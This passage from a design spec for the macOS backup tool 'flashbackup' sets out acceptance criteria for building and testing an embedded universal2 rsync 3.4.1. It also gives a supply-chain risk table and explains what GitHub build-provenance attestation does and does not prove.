1. **AC-12a-1**: `scripts/build-rsync.sh` produces `internal/rsync/bin/rsync.universal2` from a clean checkout in <5 minutes on M1 Max. (Wall-clock target; not asserted in CI but documented.)
2. **AC-12a-2**: `file internal/rsync/bin/rsync.universal2` reports `Mach-O universal binary with 2 architectures: [x86_64] [arm64]`.
3. **AC-12a-3**: `otool -L -arch arm64` and `otool -L -arch x86_64` both report only `/usr/lib/libSystem.B.dylib`.
4. **AC-12a-4**: `./internal/rsync/bin/rsync.universal2 --version` reports `rsync  version 3.4.1` on both arm64 and x86_64 macOS hosts.
5. **AC-12a-5**: `make build-real-rsync` produces a flashbackup binary that, against the extended-pathological fixture with no env override, completes a backup with exit 0, externally-verified content equality, xattr preservation, and ACL preservation.
6. **AC-12a-6**: `make build` (existing, unchanged) still produces a flashbackup binary that embeds the placeholder.
7. **AC-12a-7**: `make clean-rsync` removes `internal/rsync/bin/rsync.universal2` + `./build/` and echoes what it cleaned; subsequent `make build-rsync` succeeds from a clean state.
8. **AC-12a-8**: `scripts/rsync.version.attestation` records the SHA256 from all three Samba-ecosystem witnesses; CI `actions-lint` workflow enforces freshness (within 90 days of rsync.version edit) and witness agreement.
9. **AC-12a-9**: `scripts/build-rsync.sh` parses `rsync.version` via grep regex, NOT Bash source (verifiable by `grep -c '^source\|^\. ' scripts/build-rsync.sh` returning 0).

**Task 12b:**

10. **AC-12b-1**: `placeholder_rejection_test.go` passes under default build; asserts exit 1 + exit status `partial` + 0 bytes + `PLACEHOLDER rsync` marker in rsync.log.
11. **AC-12b-2 (externally-verified content equality)**: `embedded_real_rsync_test.go` asserts source SHA256 (via `internal/hash.StreamSHA256`) equals dest SHA256 (via `exec.Command("/usr/bin/shasum", "-a", "256", destPath)`) for every fixture file. The dest hash MUST come from an external subprocess, not from any function in the flashbackup binary.
12. **AC-12b-3 (xattr/ACL end-to-end)**: extended-pathological fixture includes files (g) and (h); 12b-B asserts xattr `user.flashbackup-test` survives on dest, ACL entry for the gen-time-recorded user survives on dest (compared by content semantics, not hardcoded string).
13. **AC-12b-4 (script negative tests)**: all four negative scenarios (tarball mismatch, missing prereq, corrupted cache, partial-make) exit 1 with expected error markers; pass in CI.

**CI plumbing:**

14. **AC-CI-1**: `build-rsync-smoke` runs on every commit to `main` AND every PR, across macOS 13/14/15 matrix, completes in <90 s per cell; asserts version starts with `rsync  version 3.4.1`, linkage limited to libSystem (anchored regex), `--help` exits 0.
15. **AC-CI-2**: `release.yml` runs on tag push with `environment: production` manual approval; executes 12b-B; generates build-provenance attestation; uploads as DRAFT to GitHub Releases. Fails on 12b-B failure or attestation failure.
16. **AC-CI-3**: `actions-lint.yml` enforces all third-party actions pinned to commit SHA (no floating tag) AND `scripts/rsync.version.attestation` freshness + witness agreement.

## 8. Risks and mitigations

| Risk | Likelihood | Impact | Mitigation |
|---|---|---|---|
| rsync 3.4.1 build quirk on macOS 13/14/15/16 | Low | Medium | Smoke matrix catches per-commit; rsync 3.4.x is stable upstream |
| samba.org tarball SHA256 changes (pre-pin) | Very low | High | Triple-witness Samba-ecosystem cross-check at populate time; attestation file commits the result. **Limit:** all three witnesses ultimately derive from samba.org; pre-pin samba.org compromise is not defended |
| samba.org outage at release time | Medium | Medium | GitHub mirror as primary download channel; samba.org fallback. Bootstrap procedure for first-release-per-version |
| Apple deprecates `lipo` or universal2 | Very low | High | macOS 13-16 all support universal2; revisit if Apple changes |
| Embedded rsync extracted on USB triggers Gatekeeper quarantine | Medium | Low | tmp+rename via filesystem APIs from vouched parent process; Plan 2 notarization fully resolves |
| `--disable-xxhash` removes a feature flashbackup uses | Very low | High | AC-12b-3 verifies --xattrs/--acls end-to-end; pre-implementation grep of `internal/rsync/wrapper.go` confirms no flag touches xxhash |
| Cache poisoning via fork PR | Low | Medium | `actions/cache` built-in fork-write protection; `restore-keys` prefix fallback dropped per round-2 Hacker N3; SHA-verify catches mismatched cache loudly |
| Tag-push spoofing by compromised contributor PAT | Low | Critical | `environment: production` manual approval gate. **Limit:** if MM's own GitHub credentials are compromised, attacker tags AND approves as MM — gate provides ZERO protection. Full mitigation requires hardware-key 2FA on MM account. Documented for honesty per round-2 CISO I2 + Hacker C1-verdict |
| Third-party action pointing-tag re-pointed maliciously | Low | High | All actions pinned to commit SHA; `actions-lint.yml` enforces no-floating-tag on every commit |
| Build-host shell-access injection | Low | Medium | PATH hygiene at script entry (not per-function); configure runs from freshly cleaned dir; tmp+rename audit covers extraction |
| Bash source of rsync.version → arbitrary code execution at build time | n/a (designed out) | Critical-if-introduced | Spec mandates parse-don't-source via grep regex; AC-12a-9 enforces no `source`/`.` of rsync.version in the script |
| GitHub OIDC issuer / runner compromise | Very low | Critical | Provenance attestation depends on GitHub OIDC + macos-14 runner integrity. **Limit:** an attacker who pwns either layer can mint Sigstore certs for malicious binaries. Defense in depth would require independent signing (Plan 2 GPG) |
| Phishing of friend with malicious "FlashBackup" binary | Medium | High | Provenance attestation + dual-publish SHA256 (release sidecar + release notes body); README directs to canonical URL. See §8.2 |

### 8.1 Local vs CI determinism

`make build-real-rsync` run locally on MM's Mac will NOT produce a byte-identical binary to the CI release workflow — Go ldflag injection embeds build epoch + commit SHA + builder host. **CI binary is authoritative.** Local `make build-real-rsync` is for MM's iterative testing only. AC-12a-5 specifies behavior, not byte-equality.

Reproducible-build deep-dive (SOURCE_DATE_EPOCH, trimpath, byte-identical attestation across builders) is queued for Plan 2+.

### 8.2 USB-spread threat model — what attestation actually proves

The "20 friends, not nation-state" framing assumes MM personally distributes flashbackup to each friend. The escalation case is a friend Googling for "FlashBackup" and landing on a phishing page hosting a malicious binary.

**What `actions/attest-build-provenance` proves to a verifier:** the artifact was built by GitHub Actions on flashbackup's `main` branch at the specified commit using the specified runner image. Verifiable via `cosign verify-blob` against Sigstore.

**What attestation does NOT prove:**
- Reproducibility: a verifier cannot rebuild the binary locally and confirm byte-equality (Section 8.1).
- Builder integrity: a compromised GitHub OIDC issuer or runner image could mint real-looking attestations for malicious binaries.
- Source code equivalence: attestation proves "this artifact came from THIS GitHub Actions run," not "the source you can inspect on GitHub is the source that was built." A maliciously-pushed commit to `main` followed by an immediate revert would still get attested.

These limits are honestly captured because the round-2 Tech Lead surfaced that "audit-clean" in Section 2 goal 5 had overclaimed. The full chain (reproducibility + GPG-signed source) is multi-week work properly belonging to Plan 2.

**Pre-escalation defenses (sufficient for current cohort):**
- SHA256 dual-publish (release sidecar + release notes body + repo commit).
- README directs to single canonical URL: github.com/maheshmirchandani/Backup-Pro/releases.
- Attestation present and verifiable.

**Escalation trigger to GPG signing in Plan 2 (round-2 Tech Lead Important 4 clarification):** any of the following observed in Phase 1 dogfood:
- A friend reports downloading FlashBackup from a non-github.com URL.
- A Sev1 report includes a binary whose SHA256 does not match any published Release.
- Phase 1 expands to >5 friends.

## 9. Out of scope (deferred)

Items intentionally not in this spec:

- Code signing and notarization. Plan 2.
- Reproducible-build attestation (SLSA Level 3+). Plan 2+.
- GPG signature verification of upstream rsync. Plan 2, triggered by §8.2 signals.
- Building rsync versions other than 3.4.1. Future single-file version bump.
- Adding back disabled features. Triggered by feature requirement.
- Static-build of openssl/zstd/lz4/xxhash. Same trigger.

### 9.1 Spun off from multi-hat reviews (tracked separately)

Five concerns from rounds 1 + 2 do not belong in 12a but must not be lost. Each gets a dated tracker:

1. **Task 12c — CVE-response posture stub** (round-2 CISO I3 + Tech Lead Important 5).
   - Deliverable: `SECURITY.md` + rsync-announce mailing list subscription.
   - Content: monitoring channel, CVSS ≥7.0 threshold in flashbackup-invoked code paths (`-a -c --xattrs --acls --inplace --partial --append`), 7-day re-cut SLO, GitHub Release notes "security" label convention, README "check Releases monthly" user signal.
   - Target landing: 2026-06-12 (before Phase 0 gate close on 2026-06-19).
   - If not landed by 2026-06-12: surface to MM as gate-blocker on Phase 0 close.

2. **Task 12d — Release + rollback + version-bump runbooks** (round-2 DevOps I3 + bootstrap procedure).
   - Deliverable: `docs/runbooks/release-cut.md`, `docs/runbooks/rsync-version-bump.md`, `docs/runbooks/sev1-rollback.md`.
   - Content: MM-side procedure for tag → CI approve → draft verify → publish; first-release bootstrap of `upstream-mirror/<version>` GitHub Release; Sev1-within-hour rollback (un-publish draft, delete release, yank tag, post-mortem).
   - Target landing: 2026-06-12 (before Phase 0 gate close).

3. **Reproducible builds.** Section 8.1 + 8.2 document the asymmetry honestly. Deep-dive (SOURCE_DATE_EPOCH, trimpath, multi-builder cross-check) deferred to Plan 2+.

4. **GPG signing of release artifacts.** Section 8.2 documents the escalation triggers. Plan 2.

5. **Genuinely-independent fourth witness** for upstream SHA (round-2 Hacker N4). The Samba-ecosystem dependency is acknowledged in §4.4; adding a fourth witness outside the ecosystem (Gentoo Manifest, Crater, or similar with its own GPG chain) is queued for Plan 2 alongside GPG escalation.

## 10. Spec self-review log

Initial draft review (2026-06-06 1839):
- [x] Placeholder scan + internal consistency + Bash correctness + smoke mode.

Round 1 multi-hat review (2026-06-06 1900-1930) — 9 Critical + 20 Important folded.

Round 2 multi-hat review (2026-06-06 2000-2030) — 4 Critical + ~25 Important folded into this v3:
- [x] Critical 1 (parse-don't-source): §4.4 + §5.1 grep regex implementation + AC-12a-9 enforcement.
- [x] Critical 2 (independent code path): §4.5 + AC-12b-2 explicitly require `exec.Command("/usr/bin/shasum")` for dest hashes.
- [x] Critical 3 (make build / -tags release collision): §4.2 preserves existing `make build` unchanged; new target `make build-real-rsync` composes `release embed_real_rsync` tags.
- [x] Critical 4 (layout drift): §11 nod to invariant #45 + §5.4 Plan 2 directory reservation noted.
- [x] Cluster A (threat-model honesty): §8 risk table rows explicitly document single-reviewer-gate limitation, Samba-ecosystem dependency, OIDC/runner trust limit; §4.4 rename to "triple-witness within Samba ecosystem."
- [x] Cluster B (CI/CD seams): `actions-lint.yml` workflow new; `restore-keys` dropped; bootstrap procedure documented; OIDC ordering documented; release/rollback runbook → Task 12d.
- [x] Cluster C (Plan 2 handoff seams): §5.4 has explicit Plan 2 restructure block (12b-B after staple, SHA256 of stapled, attestation subject = stapled).
- [x] Cluster D (CVE posture): Task 12c with 2026-06-12 deadline; §2 goal 5 wording tightened ("auditable at the limits of attestation").
- [x] Cluster E (fixture reuse): §4.5 extends `pathological/` for items (g) xattr + (h) ACL instead of new `12b-b/` directory.
- [x] Cluster F (test assertion fragility): §4.5 + AC-12b-2/3 cover xattr in-place write, ACL semantic compare, per-arch `otool`, separate-layer assertions.
- [x] Cluster G (script ergonomics): conditional trap, dropped `2>/dev/null`, PATH at script entry.
- [x] Cluster H (reproducibility honesty): §8.2 rewritten with what attestation proves vs not.
- [x] Cluster I (GPG escalation trigger): §8.2 names three concrete observable signals.
- [x] Hacker N1 (Bash source RCE): closed by Critical 1.
- [x] Hacker N3 (restore-keys cache poisoning): dropped from §5.4.
- [x] Hacker N6 (floating-tag enforcement): actions-lint.yml CI gate.
- [x] DevOps timeout-minutes: bumped release to 45.
- [x] QA N4 (otool regex): per-arch call.
- [x] QA N6 (cross-test sequencing): §6 cross-test paragraph.
- [x] Senior Dev I1+I2+I3: trap conditional, curl 2>/dev/null dropped, parse-don't-source closes I3.
- [x] Round-2 Minor 5-min budget enforcement: AC-12a-1 documents target; no CI enforcement (acceptable per Tech Lead Minor 2).

## 11. References

- Phase 0 dogfood log: `docs/dogfood/2026-06-05-1920-phase-0-log.md`
- Existing rsync wrapper: `internal/rsync/wrapper.go`
- Existing rsync extraction: `internal/rsync/rsync.go`
- Existing build script stub: `scripts/build-rsync.sh`
- Project design spec (Phase rollout, supported macOS): `docs/specs/2026-06-03-1532-flashbackup-design.md`
- Project design spec invariant #45 (Repository layout) — this spec adds `scripts/rsync.version` and `scripts/rsync.version.attestation` to `scripts/`, reserves `docs/runbooks/` for Task 12d, and reserves Plan 2 artifacts (`scripts/notarize.sh`, `scripts/entitlements.plist`) per the locked layout
- Existing pathological fixture: `test/fixtures/pathological/mkfixtures.sh` (extended by Task 12b)
- Existing Makefile build target: `Makefile:63-68` (preserved unchanged)
- Upstream rsync project: https://github.com/RsyncProject/rsync
- Upstream rsync downloads: https://download.samba.org/pub/rsync/src/
- rsync-announce mailing list: https://lists.samba.org/archive/rsync-announce/
- SLSA build provenance: https://slsa.dev/spec/v1.0/provenance
- Sigstore cosign verify: https://docs.sigstore.dev/cosign/verifying/verify/
